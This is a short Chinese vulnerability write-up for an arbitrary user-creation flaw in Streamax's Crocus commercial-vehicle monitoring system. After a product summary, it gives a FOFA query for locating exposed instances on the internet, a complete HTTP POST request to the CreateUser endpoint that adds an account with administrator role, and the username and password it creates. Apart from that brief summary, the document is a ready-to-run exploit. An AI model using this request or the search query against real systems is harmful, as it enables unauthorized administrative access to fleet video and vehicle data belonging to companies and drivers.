# 深圳市锐明技术股份有限公司Crocus系统存在任意用户添加漏洞

# 一、漏洞简介
锐明技术作为一家专注于AI和视频技术的商用车智能物联（AIoT）解决方案提供商，Crocus系统是其核心产品之一。Crocus系统旨在利用人工智能、高清视频、大数据和自动驾驶技术，帮助商用车减少交通事故和货物丢失，提高企业或车队的运营效率。通过车载摄像头、毫米波雷达等传感器，实现对车辆周围环境的实时感知和监控，提高驾驶安全性。利用AI技术，系统能够识别车辆和行人的身份，并分析驾驶员的驾驶行为，及时提醒驾驶员注意潜在风险。Crocus系统能够实时监控货箱状态，包括货物是否丢失、货箱是否关闭等，并通过3D检测技术实现更精准的货物识别和管理。深圳市锐明技术股份有限公司Crocus系统存在任意用户添加漏洞

# 二、影响版本
+ Crocus系统

# 三、资产测绘
+ fofa`body="/ThirdResource/respond/respond.min.js" && title="Crocus"`
+ 特征

![1720274332352-c9c6a280-a643-4bac-95f0-0f7942a72149.png](./img/G83rnMK_DVPT5oUJ/1720274332352-c9c6a280-a643-4bac-95f0-0f7942a72149-345699.png)

# 四、漏洞复现
```http
POST /RoleUser.do?Action=CreateUser HTTP/1.1
Host: 
X-Requested-With: XMLHttpRequest
Token: d2Vic2VjOjE3MjQwNjk4NzE5NDk=
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=5420BDDEB39984240BE700F2E755F2F9; Saffron.U=VUlEPTImVU49d2Vic2VjJkdJRD0xNzI0MDY5ODcxOTQ5MSZSSUQ9MSZNPUJNYXAmSU5TPTE=
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Length: 243

UserID=&RoleID=1&DirName=%E6%A0%B9%E7%9B%AE%E5%BD%95&DirPower=1&GroupPower=1&GroupPowerName=crocus-center(81)&UserName=d2Jz&Password=ed5b11f0310676df5b25b140d8aab20e&ConfirmPassword=ed5b11f0310676df5b25b140d8aab20e&TelPhone=&Email=wbs%40qq.com
```

![1724151622084-63d6b6f3-0307-46dd-93b7-2d5a96cbec88.png](./img/G83rnMK_DVPT5oUJ/1724151622084-63d6b6f3-0307-46dd-93b7-2d5a96cbec88-504456.png)

```http
wbs/QWEqwe123登录
```



> 更新: 2024-09-06 02:24:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/kvyw6n7ou52f1ui6>